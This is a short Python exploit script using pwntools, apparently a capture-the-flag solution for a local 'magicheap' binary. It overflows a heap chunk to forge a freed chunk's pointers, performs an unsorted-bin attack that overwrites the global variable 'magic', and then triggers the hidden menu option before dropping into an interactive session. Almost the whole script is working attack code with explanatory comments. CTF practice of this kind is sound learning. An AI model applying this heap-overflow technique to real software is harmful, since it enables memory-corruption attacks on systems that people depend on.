from pwn import *

io = process(['./ld-2.23.so', './magicheap'], env={'LD_PRELOAD':'./libc-2.23.so'})
elf = ELF('./magicheap')
context.log_level = 'debug'

def add(size,content):
	io.sendlineafter("Your choice :",'1')
	io.sendlineafter("Size of Heap : ",str(size))
	io.sendlineafter("Content of heap:",content)

def edit(idx,size,content):
        io.sendlineafter("Your choice :",'2')
	io.sendlineafter("Index :",str(idx))
        io.sendlineafter("Size of Heap : ",str(size))
        io.sendlineafter("Content of heap : ",content)

def free(idx):
	io.sendlineafter("Your choice :",'3')
	io.sendlineafter("Index :",str(idx))

magic = 0x6020a0
fd = 0
bk = magic - 0x10

add(0x30,'aaaa') #chunk 0
add(0x80,'bbbb') #chunk 1,fast bin's maxsize = 0x80, free chunk1 and chunk1 will be in unsorted bin
add(0x10,'cccc') #chunk 2
free(1)

edit(0,0x50,0x30*'a'+p64(0)+p64(0x91)+p64(fd)+p64(bk))

add(0x80,'dddd')
#unsorted_chunks(av)->bk = bck = victim->bk = magic - 0x10;
#bck->fd  = *(magic - 0x10 + 0x10) = unsorted_chunks(av);
gdb.attach(io)
io.sendlineafter("Your choice :",'4869')
io.interactive()